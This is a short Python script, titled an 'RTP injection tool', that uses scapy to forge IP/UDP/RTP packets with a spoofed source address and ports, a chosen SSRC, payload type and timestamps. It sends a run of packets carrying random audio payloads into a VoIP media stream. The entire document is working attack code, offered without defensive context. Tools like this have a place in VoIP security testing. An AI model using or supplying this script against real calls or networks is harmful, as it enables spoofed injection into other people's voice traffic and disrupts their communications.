#!/usr/bin/env python3
import argparse
from scapy.all import *

parser = argparse.ArgumentParser(
    description="RTP injection tool"
)

parser.add_argument(
    '--dst',
    dest="DST",
    type=str,
    required=True,
    help="RTP destination ip address"
)

parser.add_argument(
    '--src',
    dest="SRC",
    type=str,
    required=True,
    help="RTP source ip address"
)

parser.add_argument(
    '--dport',
    dest="DPORT",
    type=int,
    required=True,
    help="RTP destination port"
)

parser.add_argument(
    '--sport',
    dest="SPORT",
    type=int,
    required=True,
    help="RTP source port"
)

parser.add_argument(
    '--startseq',
    dest="SSEQ",
    type=int,
    default=0,
    help="Start sequence number. Default is \"0\""
)

parser.add_argument(
    '--endseq',
    dest="ESEQ",
    type=int,
    default=500,
    help="Number of packets. Default is \"500\""
)

parser.add_argument(
    '--ssrc',
    dest="SSRC",
    type=int,
    default=208851373,
    help="Synchronization source identifier. Default is \"208851373\""
)
parser.add_argument(
    '--type',
    dest="TYPE",
    type=int,
    default=8,
    help="Payload type. Default is \"8\", which is PCMA"
)

parser.add_argument(
    '--time',
    dest="TIME",
    type=int,
    default=2000000,
    help="Timestamp. Default is \"2000000\""
)
args = parser.parse_args()




def send_packet(i, payload, time):
    
    send(IP(dst=args.DST, src=args.SRC)/UDP(sport=args.SPORT, dport=args.DPORT)/RTP(
        version=2, 
        padding=0, 
        extension=0,
        numsync=None,
        marker=0,
        payload_type=args.TYPE,
        sequence=i,
        timestamp=time,
        sourcesync=args.SSRC
    )/Raw(load=payload))



time = args.TIME
startseq = args.SSEQ
endseq = (startseq + args.ESEQ)
i = startseq

while i < endseq:
   payload = bytearray(random.getrandbits(8) for _ in range(170))
   send_packet(i, payload, time)
   i+=1
   time+=160


